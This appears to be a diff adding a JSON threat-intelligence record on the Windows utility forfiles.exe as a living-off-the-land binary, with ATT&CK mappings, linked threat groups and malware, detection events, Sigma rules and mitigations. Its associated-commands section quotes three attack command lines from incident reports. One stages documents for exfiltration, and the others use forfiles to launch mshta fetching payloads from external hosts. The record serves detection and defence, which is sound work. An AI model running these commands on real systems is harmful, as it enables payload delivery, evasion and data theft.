@@ -1,0 +1,158 @@
+{
+  "type": "lolbin",
+  "version": 2,
+  "id": "126cd277-f624-4451-ae12-6773e01e8385",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2026-10-17T20:13:00.000Z",
+  "modified": "2026-10-17T20:13:00.000Z",
+  "name": "Forfiles.exe",
+  "image": "forfiles.exe",
+  "description": "Forfiles is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts.",
+  "attack": {
+    "id": "S0193",
+    "name": "Forfiles",
+    "type": "software",
+    "url": "https://attack.mitre.org/software/S0193",
+    "version": "20.0"
+  },
+  "summary": [
+    "Indirect command execution without invoking cmd",
+    "Execute commands to bypass restrictions on command-line interpreters"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "C:\\Windows\\System32\\forfiles.exe",
+    "C:\\Windows\\SysWOW64\\forfiles.exe"
+  ],
+  "hashes": {
+    "MD5": "9BB67AEA5E26CB136F23F29CC48D6B9E"
+  },
+  "capabilities": [
+    "Execute",
+    "Alternate data streams"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0007:Discovery:T1083",
+    "TA0009:Collection:T1005",
+    "TA0005:Stealth:T1202"
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT28",
+        "attack_id": "G0007",
+        "evidence": "uses S0193; names forfiles.exe",
+        "description": "APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms. APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.",
+        "sources": "Überwachung APT28 Forfiles June 2015 https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/; DOJ GRU Indictment Jul 2018 https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf; TrendMicro Pawn Storm 2019 https://documents.trendmicro.com/assets/white_papers/wp-pawn-storm-in-2019.pdf; Cybersecurity Advisory GRU Brute Force Campaign July 2021 https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF"
+      },
+      {
+        "name": "Lazarus Group",
+        "attack_id": "G0032",
+        "evidence": "names forfiles.exe",
+        "description": "Lazarus Group persistence mechanisms have used forfiles.exe to execute.htm files.",
+        "sources": "Qualys LolZarus https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns"
+      }
+    ],
+    "associated_campaigns": [],
+    "associated_malware": [
+      {
+        "name": "Revenge RAT",
+        "attack_id": "S0379",
+        "evidence": "names forfiles.exe",
+        "description": "Revenge RAT uses the Forfiles utility to execute commands on the system.",
+        "sources": "Cofense RevengeRAT Feb 2019 https://web.archive.org/web/20200428173819/https://cofense.com/upgrades-delivery-support-infrastructure-revenge-rat-malware-bigger-threat/"
+      }
+    ],
+    "associated_tools": [],
+    "technique_only": [],
+    "associated_commands": [
+      {
+        "command": "forfiles /P F:[REDACTED] /m *%%G /s /d +01.05.2015 /c \"cmd /c copy @path C:ProgramData[REDACTED]d@file\"",
+        "intent": "The report says the script identifies all PDF and Office documents dated after May 1st and collects them in a folder, supposedly ready to be exfiltrated.",
+        "status": "verified",
+        "source_name": "Guarnieri Bundestag Left Party Hack (netzpolitik.org) June 2015",
+        "source_url": "https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/"
+      },
+      {
+        "command": "forfiles.exe /p C:\\Windows /m win.ini /c \"powershell . mshta https://nextomax.b-cdn[.]net/nexto\"",
+        "intent": "Mandiant says the LNK file uses forfiles.exe to search C:\\Windows for win.ini and, for each match, start powershell to retrieve a second-stage payload and execute it with mshta.exe.",
+        "status": "verified",
+        "source_name": "Mandiant PEAKLIGHT August 2024",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/peaklight-decoding-stealthy-memory-only-malware"
+      },
+      {
+        "command": "C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c start mshta http ://[attacker-ip]/web\"",
+        "intent": "Malwarebytes says the attacker used forfiles.exe to launch mshta so one trusted program starts another and the execution path is harder for security tools to spot.",
+        "status": "verified",
+        "source_name": "Malwarebytes LOLBins Remcos NetSupport January 2026",
+        "source_url": "https://www.malwarebytes.com/blog/news/2026/01/can-you-use-too-many-lolbins-to-drop-some-rats"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4688,
+        "data_components": "Process Creation",
+        "techniques": "T1083, T1005"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 1,
+        "data_components": "Process Creation",
+        "techniques": "T1202"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 3,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1202"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 11,
+        "data_components": "File Creation",
+        "techniques": "T1083, T1005, T1202"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 22,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1202"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Forfiles Command Execution",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_forfiles_proxy_execution_.yml"
+      }
+    ],
+    "related_sigma_rules": 13,
+    "other_rules": []
+  },
+  "related_CVE": [],
+  "mitigations": [
+    {
+      "id": "M1057",
+      "name": "Data Loss Prevention",
+      "technique": "T1005"
+    }
+  ],
+  "additional_mitigations": [],
+  "references": [
+    "https://attack.mitre.org/software/S0193",
+    "https://lolbas-project.github.io/lolbas/Binaries/Forfiles/",
+    "https://strontic.github.io/xcyclopedia/library/forfiles.exe-9BB67AEA5E26CB136F23F29CC48D6B9E.html"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
